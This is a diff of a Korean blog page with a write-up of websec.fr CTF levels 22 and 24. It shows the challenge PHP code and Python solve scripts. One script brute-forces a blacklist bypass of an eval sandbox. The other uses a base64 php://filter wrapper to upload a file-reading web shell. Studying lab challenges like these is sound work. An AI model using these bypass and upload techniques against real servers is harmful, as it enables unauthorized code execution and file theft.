class="hljs-variable">$pro</span> ;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pri</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pub</span>, <span class="hljs-variable">$pro</span>, <span class="hljs-variable">$pri</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;pub = <span class="hljs-variable">$pub</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;pro = <span class="hljs-variable">$pro</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;pri = <span class="hljs-variable">$pri</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;file_containing_the_flag_parts.php&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$f1</span>, <span class="hljs-variable">$f2</span>, <span class="hljs-variable">$f3</span>);<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$f1</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$f2</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$f3</span>);<br><br><span class="hljs-variable">$funcs_internal</span> = get_defined_functions()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><br><span class="hljs-comment">/* lets allow some secure funcs here */</span><br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$funcs_internal</span>[array_search(<span class="hljs-string">&#x27;strlen&#x27;</span>, <span class="hljs-variable">$funcs_internal</span>)]);<br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$funcs_internal</span>[array_search(<span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-variable">$funcs_internal</span>)]);<br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$funcs_internal</span>[array_search(<span class="hljs-string">&#x27;strcmp&#x27;</span>, <span class="hljs-variable">$funcs_internal</span>)]);<br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$funcs_internal</span>[array_search(<span class="hljs-string">&#x27;strncmp&#x27;</span>, <span class="hljs-variable">$funcs_internal</span>)]);<br><br><span class="hljs-variable">$funcs_extra</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;function&#x27;</span>);<br><span class="hljs-variable">$funny_chars</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&#x27;\.&#x27;</span>, <span class="hljs-string">&#x27;\+&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>);<br><span class="hljs-variable">$variables</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&#x27;_GET&#x27;</span>, <span class="hljs-string">&#x27;_POST&#x27;</span>, <span class="hljs-string">&#x27;_COOKIE&#x27;</span>, <span class="hljs-string">&#x27;_REQUEST&#x27;</span>, <span class="hljs-string">&#x27;_SERVER&#x27;</span>, <span class="hljs-string">&#x27;_FILES&#x27;</span>, <span class="hljs-string">&#x27;_ENV&#x27;</span>, <span class="hljs-string">&#x27;HTTP_ENV_VARS&#x27;</span>, <span class="hljs-string">&#x27;_SESSION&#x27;</span>, <span class="hljs-string">&#x27;GLOBALS&#x27;</span>);<br><br><span class="hljs-variable">$blacklist</span> = array_merge(<span class="hljs-variable">$funcs_internal</span>, <span class="hljs-variable">$funcs_extra</span>, <span class="hljs-variable">$funny_chars</span>, <span class="hljs-variable">$variables</span>);<br><br><span class="hljs-variable">$insecure</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blacklisted</span>) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blacklisted</span> . <span class="hljs-string">&#x27;/im&#x27;</span>, <span class="hljs-variable">$code</span>)) &#123;<br>        <span class="hljs-variable">$insecure</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$insecure</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Insecure code detected!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">eval</span> (<span class="hljs-string">&quot;echo <span class="hljs-subst">$code</span>;&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>먼저 $code 변수에는 임의로 값을 넣어 eval($code) 형식으로 실행 시킬 수 있다.</p>
 <p>php sandbox형 문제인데, 처음에 생각한 방법이 $blacklist에 정의된 배열을 뽑아내서 플래그를 볼려고 했다.</p>
 <p>근데 길이 제한이 21자 이기 때문에 페이로드가 길어지면 사용이 불가능하다. (심지어 플래그 파일명이 졸라 길다)</p>
@@ -780,109 +482,13 @@ if ($insecure) &#123;
 <p>a 객체를 만들어주고 unset 해주는 부분을 볼 수 있는데, 이 객체를 사용해서 var_dump로 출력을 찍어내서 보면 플래그가 있다.</p>
 <p>위 과정들을 손수 하기에는 아~주 귀찮아서 파이썬으로 짜서 풀었다.</p>
 <p>배열 내에서 var_dump() 함수 찾는게 좀 노가다 인데.. 그냥 좀 기다리면 된다.</p>
-<pre><code class="py">#!/usr/bin/python3
-
-import requests
-
-def read():
-    for i in range(1,1000):
-        blacklist = &#39;$blacklist&#123;&#39;+str(i)+&#39;&#125;($a)&#39;
-        url = &#39;https://websec.fr/level22/index.php&#39;
-        param = &#123;&#39;code&#39;:blacklist, &#39;submit&#39;:&#39;a&#39;&#125;
-        r = requests.get(url, params=param)
-
-        if &quot;WEBSEC&quot; in r.text:
-            print r.text
-            break
-        else:
-            print &quot;sending payload&quot;+blacklist
-read()</code></pre>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        blacklist = <span class="hljs-string">&#x27;$blacklist&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&#125;($a)&#x27;</span><br>        url = <span class="hljs-string">&#x27;https://websec.fr/level22/index.php&#x27;</span><br>        param = &#123;<span class="hljs-string">&#x27;code&#x27;</span>:blacklist, <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>&#125;<br>        r = requests.get(url, params=param)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;WEBSEC&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span> r.text<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;sending payload&quot;</span>+blacklist<br>read()<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="10-LEVEL-24"><a href="#10-LEVEL-24" class="headerlink" title="10. LEVEL 24"></a>10. LEVEL 24</h3><pre><code class="php">&lt;?php
-ini_set(&#39;display_errors&#39;, &#39;on&#39;);
-ini_set(&#39;error_reporting&#39;, E_ALL);
-
-session_start();
-
-include &#39;clean_up.php&#39;;
-
-/* periodic cleanup */
-foreach (glob(&quot;./uploads/*&quot;) as $file) &#123;
-    if (is_file($file)) &#123;
-        unlink($file);
-    &#125; else &#123;
-        if (time() - filemtime($file) &gt;= 60 * 60 * 24 * 7) &#123;
-            Delete($file);
-        &#125;
-    &#125;
-&#125;
-
-$upload_dir = sprintf(&quot;./uploads/%s/&quot;, session_id());
-@mkdir($upload_dir, 0755, true);
-
-/* sandboxing ! */
-chdir($upload_dir);
-ini_set(&#39;open_basedir&#39;, &#39;.&#39;);
-
-$p = &quot;list&quot;;
-$data = &quot;&quot;;
-$filename = &quot;&quot;;
-
-if (isset($_GET[&#39;p&#39;]) &amp;&amp; isset($_GET[&#39;filename&#39;]) ) &#123;
-    $filename = $_GET[&#39;filename&#39;];
-    if ($_GET[&#39;p&#39;] === &quot;edit&quot;) &#123;
-        $p = &quot;edit&quot;;
-        if (isset($_POST[&#39;data&#39;])) &#123;
-            $data = $_POST[&#39;data&#39;];
-            if (strpos($data, &#39;&lt;?&#39;)  === false &amp;&amp; stripos($data, &#39;script&#39;)  === false) &#123;  # no interpretable code please.
-                file_put_contents($_GET[&#39;filename&#39;], $data);
-                die (&#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#39;);
-            &#125;
-        &#125; elseif (file_exists($_GET[&#39;filename&#39;]))&#123;
-            $data = file_get_contents($_GET[&#39;filename&#39;]);
-        &#125;
-    &#125;
-&#125;
-?&gt;</code></pre>
+<h3 id="10-LEVEL-24"><a href="#10-LEVEL-24" class="headerlink" title="10. LEVEL 24"></a>10. LEVEL 24</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;error_reporting&#x27;</span>, E_ALL);<br><br>session_start();<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;clean_up.php&#x27;</span>;<br><br><span class="hljs-comment">/* periodic cleanup */</span><br><span class="hljs-keyword">foreach</span> (glob(<span class="hljs-string">&quot;./uploads/*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span> (is_file(<span class="hljs-variable">$file</span>)) &#123;<br>        unlink(<span class="hljs-variable">$file</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (time() - filemtime(<span class="hljs-variable">$file</span>) &gt;= <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">7</span>) &#123;<br>            Delete(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$upload_dir</span> = sprintf(<span class="hljs-string">&quot;./uploads/%s/&quot;</span>, session_id());<br>@mkdir(<span class="hljs-variable">$upload_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">/* sandboxing ! */</span><br>chdir(<span class="hljs-variable">$upload_dir</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br><span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;list&quot;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) ) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>] === <span class="hljs-string">&quot;edit&quot;</span>) &#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;edit&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&lt;?&#x27;</span>)  === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;script&#x27;</span>)  === <span class="hljs-literal">false</span>) &#123;  <span class="hljs-comment"># no interpretable code please.</span><br>                file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$data</span>);<br>                <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#x27;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">elseif</span> (file_exists(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>파일 업로드 문제이다. 웹 쉘을 업로드 해서 간단히 문제를 해결할 수 있지만,</p>
 <p>파일 내용에 &lt;? 이 못들어가도록 php 코드 실행을 허술(?) 하게 막고 있다.</p>
 <p>이는 php wrapper인 base64 en/decode 방식을 사용하면 된다.</p>
-<pre><code class="py">#!/usr/bin/python3
-
-#import requests
-import requests
-import base64
-
-filename = &#39;shell.php&#39;
-
-def session(sess):
-    url = sess.get(&#39;https://websec.fr/level24/index.php&#39;)
-    session_key = url.cookies.get_dict()[&#39;PHPSESSID&#39;]
-    return session_key
-
-def shell():
-    return &quot;&lt;?php echo file_get_contents(&#39;../../flag.php&#39;); ?&gt;&quot;.encode(&#39;base64&#39;)
-
-def exploit(sess):
-    payload = &#39;php://filter/convert.base64-decode/resource=&#39;+filename
-    url = &#39;https://websec.fr/level24/index.php?p=edit&amp;filename=&#39;+payload
-    data = &#123;&#39;filename&#39;: payload, &#39;data&#39;: shell()&#125;
-    req = sess.post(url, data=data)
-
-
-def execute(sess, session_key):
-    url = &#39;https://websec.fr/level24/uploads/&#39;+session_key+&#39;/&#39;+filename
-    r = sess.get(url)
-    print url
-    print r.text
-
-def main():
-    sess = requests.Session()
-    session_key = session(sess)
-    exploit(sess)
-    execute(sess, session_key)
-
-main()</code></pre>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-comment">#import requests</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>filename = <span class="hljs-string">&#x27;shell.php&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">session</span>(<span class="hljs-params">sess</span>):</span><br>    url = sess.get(<span class="hljs-string">&#x27;https://websec.fr/level24/index.php&#x27;</span>)<br>    session_key = url.cookies.get_dict()[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]<br>    <span class="hljs-keyword">return</span> session_key<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;?php echo file_get_contents(&#x27;../../flag.php&#x27;); ?&gt;&quot;</span>.encode(<span class="hljs-string">&#x27;base64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">sess</span>):</span><br>    payload = <span class="hljs-string">&#x27;php://filter/convert.base64-decode/resource=&#x27;</span>+filename<br>    url = <span class="hljs-string">&#x27;https://websec.fr/level24/index.php?p=edit&amp;filename=&#x27;</span>+payload<br>    data = &#123;<span class="hljs-string">&#x27;filename&#x27;</span>: payload, <span class="hljs-string">&#x27;data&#x27;</span>: shell()&#125;<br>    req = sess.post(url, data=data)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute</span>(<span class="hljs-params">sess, session_key</span>):</span><br>    url = <span class="hljs-string">&#x27;https://websec.fr/level24/uploads/&#x27;</span>+session_key+<span class="hljs-string">&#x27;/&#x27;</span>+filename<br>    r = sess.get(url)<br>    <span class="hljs-built_in">print</span> url<br>    <span class="hljs-built_in">print</span> r.text<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    sess = requests.Session()<br>    session_key = session(sess)<br>    exploit(sess)<br>    execute(sess, session_key)<br><br>main()<br></code></pre></td></tr></table></figure>
 <p>세션값이 실행 시마다 변경되기 때문에 같은 방법으로 실행 때 마다 새 세션을 구해줘야 하는데,</p>
 <p>이 부분에서 세션키를 얻는 과정이 갑자기 생각안나서 한 2시간 잡고있었던 것 같다..</p>
 <p>풀면서 느낀거지만, 파이썬 언어 연습좀 더 해야겠다.</p>
@@ -913,10 +519,10 @@ main()</code></pre>
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-14T00:00:00+09:00">
+          <div class="new-meta-item date">
   <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditMay 14, 2020</p>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : May 14, 2020</p>
   </a>
 </div>
 
@@ -944,9 +550,7 @@ main()</code></pre>
       
         <a class='prev' href='/2020/05/14/websecbaby-200514/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>websec.fr babysteps Write up</p>
-          <p class='content'>1. LEVEL-1class LevelOne &#123;
-    public function doQuery($injection) &#123;
-        $pdo = new...</p>
+          <p class='content'>1. LEVEL-1123456789101112131415class LevelOne &#123;    public function doQuery($injection) &#123...</p>
         </a>
       
       
@@ -999,7 +603,7 @@ main()</code></pre>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-2"><span class="toc-text">1. LEVEL 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-8"><span class="toc-text">2. LEVEL 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-10"><span class="toc-text">3. LEVEL 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-11"><span class="toc-text">4. LEVEL 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-13"><span class="toc-text">5. LEVEL 13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-15"><span class="toc-text">6. LEVEL 15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-LEVEL-20"><span class="toc-text">8. LEVEL 20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-LEVEL-22"><span class="toc-text">9. LEVEL 22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-LEVEL-24"><span class="toc-text">10. LEVEL 24</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-2"><span class="toc-number">1.</span> <span class="toc-text">1. LEVEL 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-8"><span class="toc-number">2.</span> <span class="toc-text">2. LEVEL 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-10"><span class="toc-number">3.</span> <span class="toc-text">3. LEVEL 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-11"><span class="toc-number">4.</span> <span class="toc-text">4. LEVEL 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-13"><span class="toc-number">5.</span> <span class="toc-text">5. LEVEL 13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-15"><span class="toc-number">6.</span> <span class="toc-text">6. LEVEL 15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-LEVEL-20"><span class="toc-number">7.</span> <span class="toc-text">8. LEVEL 20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-LEVEL-22"><span class="toc-number">8.</span> <span class="toc-text">9. LEVEL 22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-LEVEL-24"><span class="toc-number">9.</span> <span class="toc-text">10. LEVEL 24</span></a></li></ol>
     </div>
   </section>
 
@@ -1169,7 +773,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1562,6 +1166,215 @@ volantis.pjax.push(()=>{
 
 
 
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://blog.jhyeon.dev' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
 
 
 
@@ -1583,8 +1396,6 @@ function listennSidebarTOC() {
       event.preventDefault();
       window.scrollTo({
 		top: target.offsetTop + 100,
-		
-		behavior: "smooth"
 		
 	  });
     });
